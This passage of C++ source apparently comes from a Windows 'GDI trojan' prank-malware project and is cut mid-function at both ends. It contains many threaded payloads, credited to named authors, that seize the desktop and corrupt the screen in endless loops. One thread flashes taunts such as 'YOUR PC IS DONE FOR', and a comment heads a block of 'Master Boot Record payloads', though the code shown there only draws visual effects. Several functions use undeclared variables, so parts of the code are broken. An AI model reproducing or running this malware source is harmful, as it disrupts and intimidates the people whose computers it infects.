    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = (int)((i ^ 4) + (i * 4) * abs(x ^ y));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 40000.f + y / screenHeight * .2f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

}

DWORD WINAPI VenraTech_Payload2(LPVOID lpParam) {
        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);

        INT i = 0;
        DOUBLE angle = 0.f;

        int ws = w / 5;
        int hs = h / 3;

        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

            RGBQUAD rgbquadCopy;
            INT rw = rand() % w, rh = rand() % h;
            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    INT d = 128 + i;
                    INT cx = x - rw / 2, cy = y - rh / 2; // PEMDAS! Division comes before subtraction, so that will work

                    INT dx = cx * cx, dy = cy * cy;
                    INT fx = d + (d * sin(sqrt(dx + dy) / d));

                    rgbquad[index].rgbRed *= fx + 16;
                    rgbquad[index].rgbGreen += fx + 32;
                    rgbquad[index].rgbRed *= fx + 64;
                }
            }

            i++; angle += 0.01f;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, NOTSRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }
}

DWORD WINAPI sixtyfourYT_Payload2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            INT nBlockSize = rand() % 129 + 128;
            INT nNewBlockSize = nBlockSize + (rand() % 17 + 16);

            INT x = rand() % (w - nBlockSize);
            INT y = rand() % (h - nBlockSize);

            SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
            StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 5, y - (nNewBlockSize - nBlockSize) / 5, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, PATINVERT);
            StretchBlt(hdc, x - (nNewBlockSize - nBlockSize) / 10, y - (nNewBlockSize - nBlockSize) / 10, nNewBlockSize, nNewBlockSize, hdc, x, y, nBlockSize, nBlockSize, SRCINVERT);
            StretchBlt(hdc, -10, -10, w + 20, h + 20, hdc, 0, 0, w, h, SRCINVERT);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI VenraTech_Payload3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                INT d = 128 + i;

                INT rw = rand() % w, rh = rand() % h;
                INT cx = x - (rw / 2), cy = y - (rh / 2);

                INT dx = cx * cx, dy = cy * cy;
                INT FX = d + (d * sin(sqrt(dx + dy) / d));

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);

                hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(FX | x ^ y) / 100000.0 + 0.09, 1.0);
                hslcolor.s = 1.f;

                if (hslcolor.l < .4f)
                {
                    hslcolor.l += .2f;
                }

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 3, 3, w - 6, h - 6, hdc, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI textouts(LPVOID lpParam) {
    int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
    LPCSTR text1 = 0;
    LPCSTR text2 = 0;
    LPCSTR text3 = 0;
    LPCSTR text4 = 0;
    LPCSTR text5 = 0;
    LPCSTR text6 = 0;
    LPCSTR text7 = 0;
    LPCSTR text8 = 0;
    LPCSTR text9 = 0;
    LPCSTR text10 = 0;
    LPCSTR text11 = 0;

    while (1)
    {
        HDC hdc = GetDC(0);
        text1 = "PENTOXYLCHROMINE.EXE";
        text2 = "ULTRADASHER965";
        text3 = "TELEPATHII";
        text4 = "NUMBER333";
        text5 = "EXECUTIONER";
        text6 = "SIXTYFOURYT";
        text7 = "YOUR PC IS DONE FOR";
        text8 = "THERE IS NO FUCKING HOPE";
        text9 = "YOU SHOULD GO THINK YOUR LIFE DECISIONS";
        text10 = "YOU STUPID IDIOT";
        text11 = "camellia is a skidder";

        SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
        SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));

        HFONT font1 = CreateFontA(20, 14, rand() % 3600, rand() % 360, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Verdana");
        SelectObject(hdc, font1);

        TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
        TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
        TextOutA(hdc, rand() % x, rand() % y, text3, strlen(text3));
        TextOutA(hdc, rand() % x, rand() % y, text4, strlen(text4));
        TextOutA(hdc, rand() % x, rand() % y, text5, strlen(text5));
        TextOutA(hdc, rand() % x, rand() % y, text6, strlen(text6));
        TextOutA(hdc, rand() % x, rand() % y, text7, strlen(text7));
        TextOutA(hdc, rand() % x, rand() % y, text8, strlen(text8));
        TextOutA(hdc, rand() % x, rand() % y, text9, strlen(text9));
        TextOutA(hdc, rand() % x, rand() % y, text10, strlen(text10));
        TextOutA(hdc, rand() % x, rand() % y, text11, strlen(text11));

        DeleteObject(font1);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI TELEPATHII_Payload3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    INT z = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCERASE);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                int fx = ((x + y) ^ ((x + i) ^ abs(y + i))) / 10;

                rgbquad[index].rgbRed ^= fx;
                rgbquad[index].rgbGreen ^= fx + 2;
                rgbquad[index].rgbBlue ^= fx + 4;
            }
        }

        i++;
        z += 2;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
        BitBlt(hdc, rand() % 3, rand() % 3, w, h, hdc, rand() % 3, rand() % 3, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI Number333_Payload3(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hMemDC, hBitmap);
    HDC hBlurDC = CreateCompatibleDC(hScreen);
    HBITMAP hBlurBmp = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hBlurDC, hBlurBmp);
    float angle = 0.0f;
    float time = 0.0f;
    while (true) {
        hScreen = GetDC(NULL);
        BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
        ShiftColors(hMemDC, hBitmap, screenWidth, screenHeight);
        SetGraphicsMode(hScreen, GM_ADVANCED);
        XFORM xform;
        float rad = angle * 3.14159f / 1.01f;
        xform.eM11 = atan(rad);
        xform.eM12 = sin(rad);
        xform.eM21 = -sin(rad);
        xform.eM22 = atan(rad);
        xform.eDx = (1 - xform.eM11) * (screenWidth / 2) - xform.eM21 * (screenHeight / 2);
        xform.eDy = (1 - xform.eM22) * (screenHeight / 2) - xform.eM12 * (screenWidth / 2);
        SetWorldTransform(hScreen, &xform);
        BitBlt(hScreen, 0, 0, screenWidth, screenHeight, hMemDC, 0, 0, SRCCOPY);
        ModifyWorldTransform(hScreen, NULL, MWT_IDENTITY);
        BitBlt(hBlurDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
        angle += 2.f;
        if (angle >= 360.0f) angle -= 360.0f;
            HDC hdcScreen = GetDC(NULL);
            ApplyDistortion2(hdcScreen, w, h, time);
            BitBlt(hdcScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
            time += 0.1f;
            ReleaseDC(NULL, hdcScreen);
    }
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    DeleteObject(hBlurBmp);
    DeleteDC(hBlurDC);
    ReleaseDC(NULL, hScreen);
}

DWORD WINAPI Number333_Payload4(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hMemDC, hBitmap);
    HDC hBlurDC = CreateCompatibleDC(hScreen);
    HBITMAP hBlurBmp = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hBlurDC, hBlurBmp);
    float angle = 0.0f;
    while (true) {
        hScreen = GetDC(NULL);
        BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
        SetGraphicsMode(hScreen, GM_ADVANCED);
        XFORM xform;
        float rad = angle * 3.14159f / 1.01f;
        xform.eM11 = atan(rad);
        xform.eM12 = sin(rad);
        xform.eM21 = -cos(rad);
        xform.eM22 = atan(rad);
        xform.eDx = (1 - xform.eM11) * (screenWidth / 2) - xform.eM21 * (screenHeight / 2);
        xform.eDy = (1 - xform.eM22) * (screenHeight / 2) - xform.eM12 * (screenWidth / 2);
        SetWorldTransform(hScreen, &xform);
        StretchBlt(hScreen, 10, 10, screenWidth + xform.eDx, screenHeight + xform.eDy, hMemDC, 0, 0, w, h, SRCCOPY);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCAND);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCPAINT);
        ModifyWorldTransform(hScreen, NULL, MWT_IDENTITY);
        BitBlt(hBlurDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
        angle += 2.f;
    }
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    DeleteObject(hBlurBmp);
    DeleteDC(hBlurDC);
    ReleaseDC(NULL, hScreen);
}

DWORD WINAPI sixtyfourYT_Payload3(LPVOID lpParam) {
    {
        HDC hdc = GetDC(NULL);
        INT w = GetSystemMetrics(SM_CXSCREEN);
        INT h = GetSystemMetrics(SM_CYSCREEN);

        for (;;)
        {
            for (INT i = 0; i < 5; i++)
            {
                HDC hdc = GetDC(NULL);
                INT randW = rand() % h;
                INT randH = h - rand() % h - (h / 8 - 8);

                BitBlt(hdc, 0, randW, w, randH, hdc, rand() % 96 - 56, randW, NOTSRCCOPY);
                BitBlt(hdc, 0, randW, w, randH, hdc, rand() % 96 - 56, randW, SRCAND);
                BitBlt(hdc, 0, randW, w, randH, hdc, rand() % 96 - 56, randW, SRCERASE);
                BitBlt(hdc, 0, randW, w, randH, hdc, rand() % 96 - 56, randW, SRCPAINT);
            }
            ReleaseDC(NULL, hdc);
        }
    }
}

DWORD WINAPI sixtyfourYT_Payload4(LPVOID lpVoid) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hMemDC, hBitmap);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            ShiftColors(hMemDC, hBitmap, screenWidth, screenHeight);
            HDC hdc = GetDC(NULL);
            INT randW = rand() % w;
            INT randH = rand() % h;

            BitBlt(hdc, randW, rand() % 20 - 10, 100, h, hdc, randW, 0, SRCAND);
            BitBlt(hdc, rand() % 20 - 10, randH, w, 100, hdc, 0, randH, SRCPAINT);
        }
        ReleaseDC(NULL, hdc);
        DeleteObject(hBitmap);
        DeleteDC(hMemDC);
    }
}

DWORD WINAPI VenraTech_Payload4_1(LPVOID lpParam) { //Credits to VenraTech for this payload, but I modified it

    int i = 0;
    while (1)
    {
        HDC hdc = GetDC(0);
        HDC hdc1 = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);

        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };

        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;

        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                float fx = (int)(((i ^ (x * y)) * 2) - (tan(x ^ y) * tan(x & y)));

                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);

                hslcolor.s = 1.f;
                hslcolor.l += .1f;

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        BitBlt(hdc1, 2, 2, w, h, hdc, 2, 2, SRCPAINT);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hdc1);
        ReleaseDC(0, hcdc);

        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI VenraTech_Payload4_2(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI Number333_Payload5(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        BitBlt(hdc, 10, 10, w, h, hdc, 10, 10, SRCAND);
        BitBlt(hdc, -10, -10, w, h, hdc, -10, -9, SRCPAINT);
        StretchBlt(hdc, -1, -1, w + 2, h + 2, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 100, 100, w - 200, h - 200, hdc, 0, 0, w, h, SRCINVERT);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI TELEPATHII_Payload4(LPVOID lpParam) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hMemDC, hBitmap);
    HDC hBlurDC = CreateCompatibleDC(hScreen);
    HBITMAP hBlurBmp = CreateCompatibleBitmap(hScreen, screenWidth, screenHeight);
    SelectObject(hBlurDC, hBlurBmp);
    float angle = 0.0f;
    float time = 0.0f;
    while (true) {
        hScreen = GetDC(NULL);
        BitBlt(hMemDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
        SetGraphicsMode(hScreen, GM_ADVANCED);
        XFORM xform;
        float rad = angle * 3.14159f / 1.01f;
        xform.eM11 = atan(rad);
        xform.eM12 = sin(rad);
        xform.eM21 = -cos(rad);
        xform.eM22 = atan(rad);
        xform.eDx = (1 - xform.eM11) * (screenWidth / 2) - xform.eM21 * (screenHeight / 2);
        xform.eDy = (1 - xform.eM22) * (screenHeight / 2) - xform.eM12 * (screenWidth / 2);
        SetWorldTransform(hScreen, &xform);
        StretchBlt(hScreen, -10, -10, screenWidth + (xform.eDx / 10), screenHeight + (xform.eDy / 10), hMemDC, 0, 0, w, h, NOTSRCCOPY);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCAND);
        BitBlt(hdc, rand() % 2, rand() % 2, w, h, hdc, rand() % 2, rand() % 2, SRCPAINT);
        ModifyWorldTransform(hScreen, NULL, MWT_IDENTITY);
        BitBlt(hBlurDC, 0, 0, screenWidth, screenHeight, hScreen, 0, 0, SRCCOPY);
        angle += 2.f;
    }
    DeleteObject(hBitmap);
    DeleteDC(hMemDC);
    DeleteObject(hBlurBmp);
    DeleteDC(hBlurDC);
    ReleaseDC(NULL, hScreen);
}

DWORD WINAPI UltraDasher965_Payload4(LPVOID lpParam) {
    float time = 0.0f;
    HDC hScreen = GetDC(NULL);
    HDC hMemDC = CreateCompatibleDC(hScreen);
    while (1) {
        HDC hdcScreen = GetDC(NULL);
        ApplyDistortion3(hdcScreen, w, h, time);
        BitBlt(hdcScreen, 0, 0, w, h, hMemDC, 0, 0, SRCCOPY);
        time += 0.1f;
        ReleaseDC(NULL, hdcScreen);
    }
}

DWORD WINAPI TELEPATHII_Payload5(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;
                FLOAT fx = rand() % 360;

                rgbquadCopy = rgbquad[index];

                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .1f, 1.f);

                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCINVERT);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
}

DWORD WINAPI UltraDasher965_Payload5(LPVOID lpParam) {
    while (1) {
        hdc = GetDC(0);
        BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, SRCPAINT);
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI FINALE(LPVOID lpParam) {
    while (1) {
        HDC hdc = GetDC(0);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATCOPY);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    }
}

//Master Boot Record payloads (made by Dashy & Venra / Executioner)
DWORD WINAPI VenraMBR1(LPVOID lpParam) {
        HDC hdc = GetDC(NULL);
        HDC hdcCopy = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = w;
        bmpi.bmiHeader.biHeight = h;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hdcCopy, bmp);
        INT i = 0;
        while (1)
        {
            hdc = GetDC(NULL);
            StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
            RGBQUAD rgbquadCopy;
            for (int x = 0; x < w; x++)
            {
                for (int y = 0; y < h; y++)
                {
                    int index = y * w + x;

                    INT cx = x - w / 2, cy = y - h / 2;
                    INT dx = cx * cx, dy = cy * cy;

                    INT d = 128 + i;
                    INT FX = d + (d * sin(cbrt(dx + dy) / 64));

                    rgbquadCopy = rgbquad[index];
                    hslcolor = Colors::rgb2hsl(rgbquadCopy);
                    hslcolor.h = fmod(FX / 300.f + y / h * .1f + i / 1000.f, 1.f);
                    hslcolor.s = 0.7f;
                    hslcolor.l = 0.5f;
                    rgbquad[index] = Colors::hsl2rgb(hslcolor);
                }
            }

            i++;;
            StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
            ReleaseDC(NULL, hdc);
            DeleteDC(hdc);
        }
        return 0x00;
    }

DWORD WINAPI VenraMBR2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w / 1;
    int hs = h / 1;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;
        INT rw = rand() % w, rh = rand() % h;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                INT d = 128 + i;
                INT cx = x - rw / 2, cy = y - rh / 2; // PEMDAS! Division comes before subtraction, so that will work

                INT dx = cx * cx, dy = cy * cy;
                INT fx = d + (d * sin(sqrt(dx + dy) / d));

                rgbquad[index].rgbRed = fx;
                rgbquad[index].rgbGreen = fx;
                rgbquad[index].rgbBlue = fx;
            }
        }

        i++; angle += 0.01f;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, ws, hs, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }

    return 0x00;
}

DWORD WINAPI VenraMBR3(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                INT cx = x - w / 2, cy = y - h / 2;
                INT dx = cx * cx, dy = cy * cy;

                INT d = 128 + i;
                INT FX = d + (d * ceil(ceil(dx + dy) / 64));

                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(FX / 300.f + y / h * .1f + i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }

        i++;;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI VenraMBR4(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    DOUBLE angle = 0.f;

    int ws = w / 10;
    int hs = h / 10;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, ws, hs, hdc, 0, 0, w, h, SRCCOPY);

        RGBQUAD rgbquadCopy;
        INT rw = rand() % w, rh = rand() % h;
        for (int x = 0; x < w; x++)
        {
            for (int y = 0; y < h; y++)
            {
                int index = y * w + x;

                INT d = 128 + i;
                INT cx = x - rw / 2, cy = y - rh / 2; // PEMDAS! Division comes before subtraction, so that will work

                INT dx = cx * cx, dy = cy * cy;
                INT fx = d + (d * sin(sqrt(dx + dy) / d));

                rgbquad[index].rgbRed = fx * 32;
                rgbquad[index].rgbGreen = fx * 32;
